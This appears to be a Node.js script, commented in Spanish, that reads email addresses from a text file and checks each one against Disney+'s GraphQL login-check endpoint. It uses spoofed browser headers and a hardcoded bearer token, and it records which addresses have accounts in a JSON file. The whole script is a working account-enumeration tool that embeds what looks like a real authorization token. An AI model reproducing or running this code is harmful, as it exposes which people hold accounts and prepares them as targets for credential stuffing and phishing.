import fs from "fs";

// Leer emails desde archivo txt
function leerEmailsDesdeArchivo(ruta) {
    try {
        const contenido = fs.readFileSync(ruta, "utf8");
        // Filtrar líneas vacías y espacios
        return contenido.split("\n").map(line => line.trim()).filter(line => line.length > 0);
    } catch (error) {
        console.error("❌ Error leyendo archivo de emails:", error.message);
        return [];
    }
}

// Cargar emails desde el archivo
const emailsALeer = leerEmailsDesdeArchivo("./emails.txt");

if (emailsALeer.length === 0) {
    console.log("No se encontraron emails para procesar. Asegúrate de crear el archivo 'emails.txt' con un email por línea.");
    process.exit(1);
}

console.log(`Se encontraron ${emailsALeer.length} emails para procesar.\n`);

var TOKEN = "Bearer eyJ6aXAiOiJERUYiLCJraWQiOiJ0Vy10M2ZQUTJEN2Q0YlBWTU1rSkd4dkJlZ0ZXQkdXek5KcFFtOGRJMWYwIiwiY3R5IjoiSldUIiwiZW5jIjoiQzIwUCIsImFsZyI6ImRpciJ9..WbcwRwLF6rIw6fsg.8Iew217dBnvoQLHSLNY4jEZgzSYlnhcDTD3ITw4CLcXRl2AZJv_h7dUyrihofRfm4R7FMyT_kUfG_Odlxx7KV3OHLJXTAO7wrquwIftZqYrAGcjfIrD_KDrKo30ki0-rpEjiDpjXauExAlYdjayVtjtzBAFK9Vel10FLxk5eBjvguE-yvaUv29k7jl3AaucuBgp4I77FytEm5k55jiKbBy7nCPEL1KMrF--38QkiseAnQt3DhfnSOP1hu2ljtP37U9aJij7-3GkVpkt-54xHDLI7V0IoCh9XaAwJTzLkggCjw0vy-d-UhzV0ny899uD2fuzGz4ufD6T4KRPeibDgJgGqy2h89AaVXudIsv6T3eLkmwW2XmTF5nRg_8CqwvV3-SF0fF-wpA_s3VGnb_qIY_aRZp-sE6oXdctKL0qgNRp5YGjlsQL3xYpT0-LbcG3DACPM0jmOxPSh2N0dGAhHoDzkH3vx2g_7FxL6wrPyvB256zb8jyoLksIOMLkdy_lOZ6wMeZbD7pkkjRW9gIimQwRqAbgakbiRiDMZ7yu51m9k1M84LyKT9CaXHg24GEyyXCKNIPBzE6oZjc8BA6Gj7Czjnd7yzLTBdwQWyGzdpSaaSwCYvtuPCBhND4zlHY0oA4ItD3PGzhEvxSiwtOPy3hBAYnuTTgleriLIyqDlx5zI3RkclVLSOaj_BLmjtYtOaoXYrOwcFS5axvOvcnjCvAk-E2MiJd50bQ5N7n8AXVlZYLdxM_63u6zIAx5GFYoY4s1KjTAYOIo858TMR6i6K54QKQ8q0LDJN_j2Ltej10_CWdZMRWsiGYHTCu-RgGMW-NOK3EpvXVyiFlDzp6d9k3ruwLHId83RBSrcGfhIEfHjAN5PxpZiDwGIwCl8K9r1f2x-epLm_gH1-Qko2ncCVpIq6lJ1PYp4YMyC4ZHw5U6-Xo_tuPyZuUl-YbpnJVTfgv9IfqSr59LCk3vccxxSsYp4PpA823YiyZDhxnzt26zKLDGsEOvQhcn9I7eHEXdqFRZMtN0erDH-oeR6AXu-EWh5MNFoMDL2-VL9SbbkuMvOyE69YW4TF3kIcorE_EHxJNstwXaORujG2c0pipr23YO8on1di_1oYePxHMt7fHAnYOa8YtyjR5d_9cam7e36_s0vo0Yw6d5TthKgZyh--nT5L9ZyZqssWoMVVt__wa1LU-5apUfVxt6Mq5vr8__apv0oA0ZLLrxhBM2THr418MEbvPhmH7QPAT8_yMwgH-_Sv8j4RerDkwhDckLvvH5D3XeTiHt4kaZ9kG1j1qYl-f3iiZv3rMq0bPmBK7cqnhiVAq3o-inoQZ3iOFY6lBOIIX_R73SfqedZITFhW79oiwdu38sVwRavfrrz7co_JOJa2luJPXXGgYfot-5A1KcvtCB5v4YM_9yv5MHHh9XsL8m8SlPZyO9T3bkfiOtk6D1CM9Q5dTQjVsW2-0WV2aykJ5p4cBAo--z9f3PXe2WphmEwpliybaf8u6CKgbVrf7VD9TmsD38i_1vgTV3tHcpUbxgGv9Z40oNwih2EQaXrxQuw2ISmku8778LJuzToWZQJcXPLEN3lw_A2lnRSh3VRNEDe9XPZ9YoP05_Wk_Fz2301dr96PsFtM8WGbEL8NWGb1gen4Ul8BmP8e8KOiNrwLEJ4yH4ypk9cccJZWcFHXIAj9jXnA9Zfdlb3IHHbr0L2tf1NIqDHBvXRRIH_HEAT8bke2JH54pDUE_IZOCmth_ekYdeJJYpKV3klNIGyIdOyQxXeAslsjwlYcIXsrNZymOjUE29XMHEK1dKIJ5ouJQUYMohHr27iZxcL9g0EA_hSSNtYXU1VkqmaIag6XZOGxAYTrt7_dDvUtT1FUgrKilGwWceeBEFHA3w4TaUeQ59uFidVy32eu2An3pr2C2QZ5T_LzNaZVXuMDKAmm-kXioCQHnSKanCxSP-a3yS5a_v4iwHf-M4w8wI9wLSEXp7UsROd8Lt6uPqBx90qyj00h37mr_NSURNj8JOdjEBWOQZDff69rcdUsUzLmELVLrWY51yWLSk3V4-91adXMrtnSGAxVrrMnPOjOoYl3YF_7G6holsetQGIARudM9TAMp1Rf2cBIAukpJPNztFkh998e86xARGUIDzV6Gx5StFNYB8Wyqu7lcpdEsrIfq0k8Gu3jZGtx9mqsZnWR8unm2nAAptWT5G0VVQohrEmrIdOr9poONb59VIiVTATFtVcLDxDpyMPwZvruc4zCqr-iXd5jXaUUqM8mRX6XaAqqW-ZVhQJjR0qFlEvkz1M2C0NXG9tcLL1SyH3INsGwubrsXy_jElBHsrAEv8S9pv_mqzVoo_LLA-Osd3iP779t2m3roEkkMkY-5crcVSRwlZ5LheC5PpTDzS6KfykfXdgV4fTHrjupcPzQ3fryhtrNJvGPBsYm6m45Iqie92U0dX5j5AoaXSW5Qjs93rl5UuQkTWMRKDm0OO2-r7K5n7mVJr8QGFQK3woBLc3zAjLQBdSp4ET7azYIqODc6D0mAkdZVsHVPXCYoaXGh1aX3Z34toiGAC9L6pE8L1f2SEkmDoRnqCQ0goeXbFvEFQIFrWu7k88K3YD4ZnLtgS2iIqlEw.4j68OsguPuX4jH7yUtBv0A"

const rutaArchivo = "./resultados.json";
fs.writeFileSync(rutaArchivo, "[]", "utf8");

function cargarJSON() {
    try {
        const data = fs.readFileSync(rutaArchivo, "utf8");
        return JSON.parse(data);
    } catch {
        return [];
    }
}

function guardarResultado(email, result) {
    const datos = cargarJSON();
    datos.push({
        email,
        exist: result.exist,
        noError: result.noError,
        errorMessage: result.errorMessage || null
    });
    fs.writeFileSync(rutaArchivo, JSON.stringify(datos, null, 2), "utf8");
}

// Procesar cada email del archivo
for (let i = 0; i < emailsALeer.length; i++) {
    const correoFormado = emailsALeer[i];

    if (!correoFormado.includes('@')) {
        console.log(`⚠️ Línea ${i + 1} no es un email válido: ${correoFormado}`);
        continue;
    }

    var result = await checkDisneyExists(correoFormado);
    guardarResultado(correoFormado, result);

    if (result.noError) {
        if (result.exist === true) {
            console.log(correoFormado + " PERRO existeeeeeeeeeeeeeeeeeeee")
        }
        if (result.exist === false) {
            console.log((i + 1) + " no existe")
        }
    }

    if (result.noError === false) {
        if (result.serverError) {
            console.error("🖥🖥🖥🖥 Error servidor: " + result.errorMessage)
        } else {
            console.log("🌐🌐🌐🌐 Error solicitud: " + result.errorMessage);
        }
    }
}

async function checkDisneyExists(email) {
    var result = {
        noError: false,
        exist: null,
        serverError: false,
        errorMessage: ""
    }
    try {
        var serverResponse = await fetch("https://disney.api.edge.bamgrid.com/v1/public/graphql ", {
            "headers": {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-application-version": "1.1.2",
                "x-bamsdk-client-id": "disney-svod-3d9324fc",
                "x-bamsdk-platform": "javascript/windows/chrome",
                "x-bamsdk-platform-id": "browser",
                "x-bamsdk-version": "34.1",
                "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
                "x-request-id": "07f43d86-8b1e-4276-a724-4ca71801239d",
                "x-request-yp-id": "624b805dafc5c73635b1a216",
                "Referer": "https://www.disneyplus.com/ ",
                "authorization": TOKEN,
            },
            "body": "{\"query\":\"\\n    query check($email: String!) {\\n        check(email: $email) {\\n            operations\\n            nextOperation\\n        }\\n    }\\n\",\"variables\":{\"email\":\"" + email + "\"},\"operationName\":\"check\"}",
            "method": "POST"
        })

        var jsonResponse = await serverResponse.json();
        if (jsonResponse.hasOwnProperty("errors")) {
            result.serverError = true;
            throw new Error(jsonResponse.errors[0].code);
        }

        if (jsonResponse.hasOwnProperty("data")) {
            if (jsonResponse.data.hasOwnProperty("check")) {
                if (jsonResponse.data.check.hasOwnProperty("operations")) {
                    if (jsonResponse.data.check.operations.includes("Login") || jsonResponse.data.check.operations.includes("OTP")) {
                        result.exist = true;
                        result.noError = true;
                        if (jsonResponse.data.check.operations.includes("Login")){
                            result.login=true
                            console.log("LOGIN")
                        }else{
                            result.login=false
                        }
                    }
                    if (jsonResponse.data.check.operations.includes("Register")) {
                        result.exist = false;
                        result.noError = true;
                    }
                }
            }
        }
        if (result.exist === null) {
            throw new Error("No se pudo determinar si existe")
        }

    } catch (error) {
        result.errorMessage = error.message;
        result.noError = false;
    } finally {
        return result
    }
}